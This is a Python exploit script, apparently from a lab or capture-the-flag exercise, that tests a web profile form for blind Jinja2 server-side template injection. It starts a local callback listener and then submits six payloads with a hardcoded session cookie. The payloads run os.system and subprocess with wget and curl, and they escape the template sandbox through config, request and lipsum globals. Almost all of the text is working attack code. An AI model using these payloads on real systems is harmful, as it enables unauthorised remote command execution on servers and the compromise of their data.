import http.server
import threading
import time
import requests
import socket

# Global variables
callback_received = False
callback_details = ""

class CallbackHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        global callback_received, callback_details
        callback_received = True
        callback_details = f"Path: {self.path} | Headers: {dict(self.headers)}"
        print(f"[!] CALLBACK RECEIVED!")
        print(f"[!] Path: {self.path}")
        self.send_response(200)
        self.end_headers()
        
    def log_message(self, format, *args):
        pass

# Try to start server
def start_server():
    try:
        server = http.server.HTTPServer(('localhost', 8888), CallbackHandler)
        thread = threading.Thread(target=server.serve_forever)
        thread.daemon = True
        thread.start()
        print("[+] HTTP server started on port 8888")
        return server
    except:
        print("[!] Port 8888 already in use, will check for existing callbacks")
        return None

print("=" * 60)
print("ENHANCED BLIND SSTI TEST - MULTI-PAYLOAD APPROACH")
print("=" * 60)

server = start_server()
time.sleep(1)

session_cookie = "eyJ1c2VyX2lkIjoxfQ.aVqK6Q.DjdnJP5cp110FpB2UDxmK976cZA"

# Test multiple fields and payload variations
payloads = [
    # Method 1: Direct urllib (original)
    {"field": "name", "payload": "{{ __import__('urllib.request').urlopen('http://localhost:8888/callback1').read() }}"},
    
    # Method 2: Using subprocess and curl
    {"field": "city", "payload": "{{ __import__('subprocess').check_output(['curl','http://localhost:8888/callback2']) }}"},
    
    # Method 3: Using os.system with wget
    {"field": "address", "payload": "{{ __import__('os').system('wget http://localhost:8888/callback3') }}"},
    
    # Method 4: Using config object traversal (common bypass)
    {"field": "country", "payload": "{{ config.__class__.__init__.__globals__['__import__']('urllib.request').urlopen('http://localhost:8888/callback4').read() }}"},
    
    # Method 5: Using request object
    {"field": "phone", "payload": "{{ request.application.__globals__['__import__']('urllib.request').urlopen('http://localhost:8888/callback5').read() }}"},
    
    # Method 6: Alternative using lipsum (if available)
    {"field": "email", "payload": "{{ lipsum.__globals__['__import__']('urllib.request').urlopen('http://localhost:8888/callback6').read() }}"}
]

results = []

try:
    # Test each payload variation
    for i, test_payload in enumerate(payloads):
        print(f"\n[+] Test {i+1}: Sending payload to field '{test_payload['field']}'")
        print(f"[+] Payload: {test_payload['payload']}")
        
        # Build form data with payload in specific field
        form_data = {
            'name': 'Test User',
            'email': 'test@example.com',
            'phone': '123-456-7890',
            'address': '123 Test Street',
            'city': 'Test City',
            'country': 'Test Country'
        }
        
        # Inject payload into specific field
        form_data[test_payload['field']] = test_payload['payload']
        
        response = requests.post(
            'http://127.0.0.1:32813/profile',
            cookies={'session': session_cookie},
            data=form_data,
            allow_redirects=False,
            timeout=10
        )
        
        print(f"[+] Status: {response.status_code}")
        
        # Check if callback was received
        time.sleep(3)
        if callback_received:
            print(f"[!] CALLBACK RECEIVED during test {i+1}!")
            print(f"[!] Details: {callback_details}")
            results.append(f"SUCCESS - Test {i+1}")
            break
        else:
            results.append(f"FAIL - Test {i+1} (Status: {response.status_code})")
        
        # Small delay between tests
        time.sleep(2)

except Exception as e:
    print(f"[!] Error during testing: {e}")

print("\n" + "=" * 60)
print("FINAL RESULTS")
print("=" * 60)
for result in results:
    print(f"[+] {result}")

if callback_received:
    print("\n[!] BLIND SSTI CONFIRMED - Outbound HTTP request succeeded")
    print(f"[!] Callback details: {callback_details}")
else:
    print("\n[-] No callbacks received")
    print("[-] Possible reasons:")
    print("    1. SSTI payload syntax incorrect for this Jinja2 version")
    print("    2. Outbound network requests blocked")
    print("    3. Template engine is sandboxed")
    print("    4. Different payload format needed")

if server:
    server.shutdown()

print("\n[+] Enhanced test complete.")
